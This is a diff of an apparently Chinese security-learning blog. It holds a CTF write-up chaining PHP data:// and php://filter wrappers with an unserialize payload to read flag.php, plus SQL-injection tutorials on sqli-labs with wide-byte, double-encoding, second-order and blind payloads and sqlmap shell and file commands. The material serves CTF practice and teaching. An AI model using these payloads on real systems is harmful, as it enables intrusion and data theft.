class="line">Origin: http://a7425027-7eb1-43be-a0c9-47a34018d60b.node3.buuoj.cn</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://a7425027-7eb1-43be-a0c9-47a34018d60b.node3.buuoj.cn/</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">welcome to the zjctf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">回包：</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: openresty</span><br><span class="line">Date: Sat, 08 Feb 2020 11:45:53 GMT</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line">Content-Length: 38</span><br><span class="line">Connection: close</span><br><span class="line">X-Powered-By: PHP/5.6.40</span><br><span class="line"></span><br><span class="line">&lt;br&gt;&lt;h1&gt;welcome to the zjctf&lt;/h1&gt;&lt;/br&gt;</span><br></pre></td></tr></table></figure>
+<p>伪协议第二次利用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$file = $_GET[&quot;file&quot;];</span><br><span class="line">if(preg_match(&quot;/flag/&quot;,$file))&#123;</span><br><span class="line">        echo &quot;Not now!&quot;;</span><br><span class="line">        exit(); </span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        include($file);  //useless.php</span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        echo $password;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>这里把flag给过滤了，肯定不是直接包含<br>注释里有一个useless.php，打开看下，但直接访问是不能打开的，尝试用伪协议php://filter</p>
+<p>?file=php://filter/read=convert.base64-encode/resource=useless.php</p>
+<p>这里顺便把前面的第一个判断用data协议绕过，进入判断语句中</p>
+<p>所以payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</span><br></pre></td></tr></table></figure>
+<p>能得到useless.php的base64编码内容<br>解码后得到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line"></span><br><span class="line">class Flag&#123;  //flag.php  </span><br><span class="line">    public $file;  </span><br><span class="line">    public function __tostring()&#123;  </span><br><span class="line">        if(isset($this-&gt;file))&#123;  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">?&gt;  </span><br></pre></td></tr></table></figure>
+<p><strong>这一段代码的意思是：获取这个</strong><code>$file</code><strong>参数代表的文件并且输出出来，注意前者的file参数和这里flag类的file参数并不一样，两者位于不同的作用域！</strong><br>根据注释提示我们应该是要包含flag.php就可以获得flag，所以Flag类中的file应该为flag.php,再加上前面如果包含了useless.php,整体代码就为如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">$text = $_GET[&quot;text&quot;];</span><br><span class="line">$file = $_GET[&quot;file&quot;];</span><br><span class="line">$password = $_GET[&quot;password&quot;];</span><br><span class="line">if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;welcome to the zjctf&quot;))&#123;</span><br><span class="line">    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;</span><br><span class="line">    if(preg_match(&quot;/flag/&quot;,$file))&#123;</span><br><span class="line">        echo &quot;Not now!&quot;;</span><br><span class="line">        exit(); </span><br><span class="line">    &#125;else&#123;</span><br><span class="line">            class Flag&#123;  //flag.php  </span><br><span class="line">        public $file;  </span><br><span class="line">        public function __tostring()&#123;  </span><br><span class="line">            if(isset($this-&gt;file))&#123;  </span><br><span class="line">                echo file_get_contents($this-&gt;file); </span><br><span class="line">                echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">            return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);</span><br><span class="line">            &#125;  </span><br><span class="line">        &#125; </span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        echo $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>在<code>$password = unserialize($password);</code>中，<code>unserialize()</code>函数是一个反序列化函数。不熟悉序列化与反序列化的可以百度一下。<br>若我们将一个序列化后的对象即一串<strong>字符串</strong>传给<code>$password</code>，那么我们会得到一个实例对象，我们便不难想象，若是我们将一个<code>useless.php</code>中的Flag对象(其中<code>$file</code>参数的值为<code>flag.php</code>)序列化后得到的字符串传给$password参数，经过反序列化后变变成了一个实例对象，一句可执行的代码,且能输出<code>flag.php</code>中的代码</p>
+<p>构造类：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">class Flag&#123;   </span><br><span class="line">    public $file=&quot;flag.php&quot;;  </span><br><span class="line">    public function __tostring()&#123;  </span><br><span class="line">        if(isset($this-&gt;file))&#123;  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">$password = new Flag();</span><br><span class="line">echo serialize($password);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<p>所以payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<p>到这里整理下思路：</p>
+<ul>
+<li>首先，利用data伪协议，text参数便可以绕过<code>if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)===&quot;welcome to the zjctf&quot;))</code>，顺利进入判断语句内</li>
+<li>然后，包含了<code>useless.php</code>文件，从而在原代码中引入了<code>Flag</code>对象，只有如此，在<code>password</code>参数反序列化才可输出<code>flag.php</code>文件的内容</li>
+<li>传入的<code>password</code>参数经过反序列化后，得到一个<code>$file=flag.php</code>的Flag对象，同时执行了该Flag对象内部的<code>__tostring()</code>方法，输出<code>flag.php</code>的内容，从而得到<code>flag</code><br>注意：需要查看网页源代码方可见到<code>flag</code><br>文件包含是否支持%00截断取决于：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHP版本&lt;=5.2 可以使用%00进行截断。</span><br></pre></td></tr></table></figure>
+
+<p>参考文章：</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/148886.html">php伪协议实现命令执行的七种姿势</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wjrblogs/p/12285202.html">CTF中常用的php伪协议利用</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/dubhe-/p/9997842.html">浅析PHP伪协议在CTF的应用</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/0a8339fcc269">PHP伪协议在CTF中的应用</a></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -1921,289 +2283,6 @@ sqlmap --crawl(sqlmap对目标网站进行爬取，然后依次进行测试）
 <p>sqlmap.py -u ‘url?id=1’ –sql-shell</p>
 <p>sqlmap.py -u ‘url?id=1’ –file-read</p>
 <p>sqlmap.py -u ‘url?id=1’ –file-write 本地文件 –file-dest 目标目录及文件</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/20/SQL/%E5%85%B6%E4%BB%96%E6%B3%A8%E5%85%A5/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/pic.jpg">
-      <meta itemprop="name" content="D0gekong">
-      <meta itemprop="description" content="散人的漫漫学习路">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hack the world">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/03/20/SQL/%E5%85%B6%E4%BB%96%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">其他注入</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2022-03-20 16:50:54 / 修改时间：16:53:58" itemprop="dateCreated datePublished" datetime="2022-03-20T16:50:54+08:00">2022-03-20</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><h3 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h3><p>GB2312,GBK等这些都是宽字节，实际为两字节</p>
-<p>常规输入’后会被处理为&#39;，然后进行编码为%5c%27即&#39;，代入sql为id=1&#39; and这明显是不能注入的</p>
-<p>当mysql在使用gbk编码，会认为两个字符为一个汉字</p>
-<p>%df’会被处理为%df&#39;，进行编码%df%5c%27,其中%df%5c组合会被认为是一个汉字（前一个ASCII码大于128才能到汉字的范围），id=某汉字’ and可以注入</p>
-<p>方法：</p>
-<p>在注入点后键入%df，然后按照正常流程开始注入</p>
-<p>less-32</p>
-<p>黑盒测试：在可能注入点后键入%df进行测试</p>
-<p>白盒测试:</p>
-<ol>
-<li>查看mysql编码是否为gbk</li>
-<li>是否使用preg_replace转义单引号</li>
-<li>是否使用addslasher转义</li>
-<li>是否使用mysql_real_escape_string转义<h3 id="练习："><a href="#练习：" class="headerlink" title="练习："></a>练习：</h3></li>
-</ol>
-<p>id=1’</p>
-<p>回显变为了1&#39;</p>
-<p>id=1%df%27</p>
-<p>回显多了个不可见字符组合成了一个汉字并报错，很明显我们可以开始注入，按照以前的流程</p>
-<p>id=%df%27 union select 1,(select user()),3–+</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=&#x27;%df&#x27; union select 1,(select user()),3--+&#x27;</span><br></pre></td></tr></table></figure>
-<p>回显当前用户，剩下的直接按照之前的套路即可<br>也可使用sqlmap</p>
-<p>但是如果不进行处理直接键入</p>
-<p>比如sqlmap -u ‘url’ 是不会显示有注入点的需要在url加一个汉字参数</p>
-<p>比如sqlmap -u ‘url?id=1%df’类似 这样即可</p>
-<p><strong>重点还是是否设置了编码gbk这些宽字节的编码！！！！！以及那些能进行转义的函数</strong></p>
-<h3 id="防御："><a href="#防御：" class="headerlink" title="防御："></a><strong>防御：</strong></h3><ol>
-<li>设置utf-8，避免宽字节注入ps：不仅在gbk，日文和韩文都存在宽字节漏洞</li>
-<li>使用mysql_real_escape_string时一定要设置mysql_set_charset(‘gbk’,$conn);</li>
-<li>可以设置参数character_set_client=binary<h2 id><a href="#" class="headerlink" title></a></h2><h2 id="二次编码注入"><a href="#二次编码注入" class="headerlink" title="二次编码注入"></a>二次编码注入</h2></li>
-</ol>
-<h3 id="原理：-1"><a href="#原理：-1" class="headerlink" title="原理："></a>原理：</h3><p>面对php代码或者配置时,urldecode()与本身处理编码时，两者配合失误，可以构造错误消灭\</p>
-<p>用户输入id=1%27，php自身编码id=1’，转义为1&#39;，代入sql为id=1&#39;不能注入</p>
-<p>php代码中放置了urldecode()等编码函数，放置在一个尴尬的位置，与php自身编码配合失误</p>
-<p>用户输入id=1%2527，自身编码为id=1%27,此时没有’没有触发转义，函数编码为id=1’，代入sql为id=1’ and可以注入</p>
-<p>代码实现：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#x27;id&#x27;]))&#123;</span><br><span class="line">$id = mysql_real_escape_string($_GET[&#x27;id&#x27;]);</span><br><span class="line">$id = urldecode($id);</span><br><span class="line">$sql = &quot;select * from users where id=&#x27;$id&#x27; limit 0,1&quot;;</span><br><span class="line">$result = mysql_query($sql);</span><br><span class="line">$row=mysql_fetch_array($result);</span><br><span class="line">if($row)</span><br><span class="line">&#123;</span><br><span class="line">xxxxx</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">xxxxx</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="练习：-1"><a href="#练习：-1" class="headerlink" title="练习："></a>练习：</h3><p>id=1’时会被转义为id=1&#39;</p>
-<p>变为id=1%2527时，回显为1’并报错可以发现会存在sql注入漏洞接下来直接按照之前的套路</p>
-<p>比如</p>
-<p>id=%2527 and union select 1,(select user()),3–+</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id =&#x27; union select 1,(select user()),3--+&#x27;</span><br></pre></td></tr></table></figure>
-<p>如果是sqlmap的话跟宽字节注入一个道理需要键入相关参数<br>比如sqlmap -u ‘url?id=1%2527’就可以跑</p>
-<p>黑盒测试：</p>
-<p>在可能的注入点键入%2527,之后进行注入测试</p>
-<p>白盒测试：</p>
-<ol>
-<li>是否使用Urldecode函数</li>
-<li>urldecode函数是否存在转义方法之后<h2 id="-1"><a href="#-1" class="headerlink" title></a></h2><h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2></li>
-</ol>
-<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>第一步：插入恶意数据：</p>
-<p>第一次进行数据库插入数据的时候，仅仅对特殊字符进行了转义，在写入的时候保留了原来的数据，但是数据本身是含有恶意内容的</p>
-<p>第二步：引用恶意数据：</p>
-<p>将数据存入到数据库之后，开发者认为数据是可信的，在下一次需要进行查询的时候，直接从数据库中取出了恶意数据，没有进行进一步的检验和处理，就会造成sql的二次注入</p>
-<p>过程：</p>
-<p>寻找插入数据库并会转义的操作，输入参数，参数经过转义函数1&#39;，参数进入数据库存储还原为1’，寻找另一处引用数据的操作，将1’从数据库中取出，取出后直接给变量并代入sql，sql注入触发</p>
-<p>代码实现：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$sql = &#x27;select * from users order by id asc&#x27;;</span><br><span class="line">$result = mysql_query($sql);</span><br><span class="line">$num = mysql_num_rows($result);</span><br><span class="line">for ($j = 0;$j&lt;$num;++$j)</span><br><span class="line">&#123;</span><br><span class="line">  $row = mysql_fetch_array($result);</span><br><span class="line">  $username = $row[1];</span><br><span class="line">  $sql_detail = &quot;select * from users where username =&#x27;$username&#x27;&quot;;</span><br><span class="line">  $result_detail=mysql_query($sql_detail);</span><br><span class="line">  $num_detail=mysql_num_rows($result_detail);</span><br><span class="line">  for($i =0;$i&lt;$num_detail;++$i)&#123;</span><br><span class="line">    $row_detail =mysql_fetch_array($result_detail);</span><br><span class="line">    xxxxxx</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="练习：less24"><a href="#练习：less24" class="headerlink" title="练习：less24"></a>练习：less24</h3><p>点击注册admin’# 密码123，然后修改密码为1314并键入原密码123</p>
-<p>查看数据库里可以看到admin这个用户密码被改成了1314，而不是admin’#这个用户的密码被修改了</p>
-<p>具体的sql语句是这样</p>
-<p>$sql=”update users set password=’1314’ where username=’admin’#’ and password = ‘$curr_pass’”;</p>
-<p>所以我们可以这样注入</p>
-<p>创建一个这样的用户</p>
-<p>1’ union select 1,user(),3# 密码123</p>
-<p>然后查看用户列表，可以看到当前用户名能显示我们数据库的当前用户</p>
-<p>执行的语句为$sql_detail = ‘select * from users where username = ‘1’ union select 1,user(),3#’”;</p>
-<p>这样就能到比较直观的二次注入的效果，不断插入我们的语句就能查询到我们想要的信息</p>
-<h3 id="-2"><a href="#-2" class="headerlink" title></a></h3><h3 id="防御：-1"><a href="#防御：-1" class="headerlink" title="防御："></a>防御：</h3><p>对外部提交的数据，需要更加严谨的对待，程序内部的数据调用，也要进行严格的检查，一不小心，测试者就能将特定的sql语句代入到查询中</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/20/SQL/%E7%9B%B2%E6%B3%A8/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/pic.jpg">
-      <meta itemprop="name" content="D0gekong">
-      <meta itemprop="description" content="散人的漫漫学习路">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hack the world">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/03/20/SQL/%E7%9B%B2%E6%B3%A8/" class="post-title-link" itemprop="url">盲注</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2022-03-20 15:40:35 / 修改时间：15:41:14" itemprop="dateCreated datePublished" datetime="2022-03-20T15:40:35+08:00">2022-03-20</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h2 id="布尔盲注："><a href="#布尔盲注：" class="headerlink" title="布尔盲注："></a>布尔盲注：</h2><p>代码存在sql注入漏洞，然而页面既不会回显数据，也不会回显错误信息，只返回right和wrong。这里我们可以通过构造语句，来判断数据库信息的正确性，再通过页面的真和假来识别我们的判断是否正确，这就是布尔盲注</p>
-<p>代码实现：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$id = $_GET[&#x27;id&#x27;];</span><br><span class="line">$sql = &quot;select * from users where id = &#x27;$id&#x27; limit 0,1&quot;;</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line">if($row)</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;right&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;wrong&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>示意过程：<br>正常请求，id=1，返回id=1的数据，错误请求id=1’，返回与正确页面不同的页面 （如果页面返回假，说明系统执行的SQL语句为假）</p>
-<p>比如：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 and left((select version(),1)=5--+</span><br></pre></td></tr></table></figure>
-
-<h3 id><a href="#" class="headerlink" title></a></h3><h3 id="使用语句："><a href="#使用语句：" class="headerlink" title="使用语句："></a>使用语句：</h3><ol>
-<li><p>left():left(database(),1)&gt;’s’<br>database()显示数据库名称，left(a,b)从左侧开始截取a的前b位</p>
-</li>
-<li><p>regexp:select user() regexp ‘^r’</p>
-</li>
-</ol>
-<p> 正则表达式的用法，user()结果为root,regexp为匹配root的正则表达式</p>
-<p> 3.like:select user() like ‘ro%’</p>
-<p>与regexp类似，使用like进行匹配</p>
-<p> 4.substr(),ascii():ascii(substr((select database()),1,1))=98</p>
-<p>substr(a,b,c)从b位置开始，截取字符串a的c长度，ascii()将某个字符转换为ascii的值</p>
-<p> 5.ord(),mid():ord(mid((select user()),1,1))=114</p>
-<p>mid(a,b,c)从位置b开始，截取a字符串的c位ord()函数同ascii()，将字符转为ascii值</p>
-<h3 id="练习："><a href="#练习：" class="headerlink" title="练习："></a>练习：</h3><h3 id="环境：sqli-lab-less-8"><a href="#环境：sqli-lab-less-8" class="headerlink" title="环境：sqli-lab less 8"></a>环境：sqli-lab less 8</h3><p>id=1</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=&#x27;1&#x27; limit 0,1</span><br></pre></td></tr></table></figure>
-<p>回显正确you are in<br>id=1’</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=&#x27;1&#x27; &#x27; limit 0,1</span><br></pre></td></tr></table></figure>
-<p>回显消失<br>id=1’ and ‘1’ = ‘1</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id = &#x27;1&#x27; and &#x27;1&#x27; =&#x27;1&#x27; limit 0,1</span><br></pre></td></tr></table></figure>
-<p>回显正确you are in<br>将后者的逻辑判断改为2，回显消失，可以判断存在sql注入漏洞</p>
-<p>使用left()来进行尝试</p>
-<p>id=1’ and left((select database()),1)=’s’–+</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=&#x27;1&#x27; and left((select database()),1)=&#x27;s&#x27; --&#x27;limit 0,1</span><br></pre></td></tr></table></figure>
-<p>回显成功you are in<br>通过此类方法就能对库名，表名，列名进行查询</p>
-<p>对表名查询</p>
-<p>id=1’ and left((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)=’e’–+</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=&#x27;1&#x27; and left((select  table_name from information_schema.tables where table_schema=database() limit 0,1),1)=&#x27;e&#x27;--+</span><br></pre></td></tr></table></figure>
-<p>回显成功 判断正确<br>注入流程就是这样，我们可以使用BP进一步提升效率，为字符添加变量，自动化跑（注意下数据库命名规则是a-z,0-9,_</p>
-<p>尝试切换为regexp试试</p>
-<p>id=1’ and (select database()) regexp ‘^s’ –+</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id = &#x27;1&#x27; and (select database()) regexp &#x27;^s&#x27; --+&#x27; limit 0,1</span><br></pre></td></tr></table></figure>
-<p>回显成功判断正确<br>id=1’ and (select table_name from information_schema.tables where table_schema=database() limit 0,1),1) regexp ‘^e’ –+</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=&#x27;1&#x27; and (select table_name from information_schema.tables where table_schema=database() limit 0,1),1) regexp &#x27;^e&#x27; --+&#x27; limit 0,1</span><br></pre></td></tr></table></figure>
-<p>回显成功判断正确，如果要判断第二位，就直接在e后面加上自己想测的字符<br>切换为like</p>
-<p>id=1’ and (select table_name from information_schema.tables where table_schema=database() limit 0,1) like ‘e%’ –+</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=&#x27;1&#x27; and(select table_name from information_schema.tables where table_schema=database() limit 0,1) like &#x27;e%&#x27; --+ limit 0,1</span><br></pre></td></tr></table></figure>
-<p>这种表示匹配以e开头的字符串，后面同理regexp<br>切换为substr以及ascii</p>
-<p>id=1’ and ascii(substr((select database()),1,1) = 115 –+</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=&#x27;1&#x27; and ascii(substr((select database()),1,1) = 98 --+&#x27; limit ,1</span><br></pre></td></tr></table></figure>
-<p>截取了从第一位字符开始长度为一的字符的ascii并判断是否等于115，这里是回显成功判断正确<br>然后查表</p>
-<p>id=1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1) = 115 –+</p>
-<p>这里回显失败判断错误，就可以借助Bp爆破字符了，爆破可得101时正确，接着调整字符长度和ASCII的值，直至爆破结束</p>
-<h2 id="-1"><a href="#-1" class="headerlink" title></a></h2><h2 id="时间盲注："><a href="#时间盲注：" class="headerlink" title="时间盲注："></a>时间盲注：</h2><h3 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h3><p>代码存在sql注入漏洞，然而页面既不会回显数据，也不会回显错误信息，语句执行后也不提示真假，我们不能通过页面的内容来进行判断，这里我们可以通过构造语句，通过页面响应的时长，来判断信息，这就是时间盲注</p>
-<h3 id="-2"><a href="#-2" class="headerlink" title></a></h3><h3 id="代码实现："><a href="#代码实现：" class="headerlink" title="代码实现："></a>代码实现：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$id = $_GET[&#x27;id&#x27;];</span><br><span class="line">$sql = &#x27;select * from users where id=&#x27;$id&#x27; limit 0,1&#x27;;</span><br><span class="line">$result = mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line">if($row)</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="示意过程"><a href="#示意过程" class="headerlink" title="示意过程:"></a>示意过程:</h3><p>登陆正常请求，name=admin&amp;pwd=1返回登陆成功的页面,在不知道账号密码的情况发送登录请求，返回登陆失败的页面，构造sql语句，发送登陆请求，返回登陆失败页面，构造语句让程序延时执行，判断信息</p>
-<p>构造逻辑语句，通过条件语句进行判断，为真则立即执行，否则延时执行</p>
-<p>核心语法：if(left(user(),1)=’a’,0,sleep(3));通过sql语句取到某个值，用left去user左侧的第一个字符，如果等于a，就立即执行，错误就延时3秒执行</p>
-<p>真实场景:if(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23</p>
